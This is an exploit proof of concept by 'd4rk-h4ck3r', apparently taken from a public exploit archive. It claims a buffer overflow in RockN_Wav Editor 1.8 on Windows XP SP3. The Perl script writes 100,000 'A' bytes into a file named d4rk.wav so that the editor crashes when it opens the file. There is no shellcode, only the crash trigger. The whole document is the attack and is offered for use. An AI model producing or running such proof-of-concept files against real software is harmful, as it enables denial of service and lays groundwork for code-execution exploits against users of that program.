# Exploit Title: RockN_Wav Editor 1.8 Buffer Overflow (POC)
# Author: d4rk-h4ck3r
# Date: 2010-08-18
# Software Link: http://www.brothersoft.com/rockn_wav-editor-23982.html
# Greetz 2 : PASSEWORD , KAiSER-J , sec4ever , tli7a , All Tun!Sian h4ck3rz
# Spacial thanks 2 : MadjiX
# Tested on: Windows XP SP3 Fr
 
$buff="A" x 100000;
open (myfile , ">>d4rk.wav");
print myfile $buff;
close (myfile);

